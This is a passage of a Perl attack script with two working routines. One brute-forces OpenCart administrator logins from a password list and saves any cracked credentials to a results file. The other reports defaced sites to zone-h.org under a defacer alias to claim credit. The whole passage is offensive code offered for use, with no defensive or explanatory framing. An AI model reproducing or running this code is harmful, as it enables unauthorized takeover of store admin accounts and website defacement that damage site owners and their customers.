next OUTER;
}
}
}
###### OpenCart #######
sub opencart{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Starting brute force\n";
open(a,"Password.txt") or die "$!";
while(<a>){
chomp($_);
$ocuser = admin;
$ocpass = $_;
print color('bold red')," [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Trying: $ocpass \n";
$OpenCart= $site . '/admin/index.php';

$ocbrute = POST $OpenCart, [username => $ocuser, password => $ocpass,];
$response = $ua->request($ocbrute);
$stat = $response->status_line;
if ($stat =~ /302/){
print color('bold green'),"Sucess == > \n $OpenCart User : admin Pass : $ocpass \n";
print color('reset');
open (TEXT, '>>Result/BrutedOpen.txt');
print TEXT "$OpenCart => User: $ocuser Pass: $ocpass\n";
close (TEXT);
}
}
}

sub zoneh(){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Zone-h Poster .... ";

    open(save, '>>Result/Index.txt');
    print save "$def\n";
    close(save);

  $hack="Kadd3chy";
  $zn="http://zone-h.org/notify/single";
  $lwp=LWP::UserAgent->new;
  $res=$lwp  -> post($zn,[
  'defacer'=> $hack,
  'domain1'   => $def,
  'hackmode' => '15',
  'reason'  => '1',
  'submit'  => 'Send',
  ]);
  if ($res->content =~ /color="red">ERROR<\/font><\/li>/) {
   print color('bold red');
print "Not Vulnerable\n";
    print color('reset');

  }
  elsif ($res->content =~ /color="red">OK<\/font><\/li>/) {
   print color('bold green');
print "[Success]\n";
    print color('reset');



  }
  else
  {
   print color('bold red');
print "Not Vulnerable\n";
    print color('reset');
}
}
}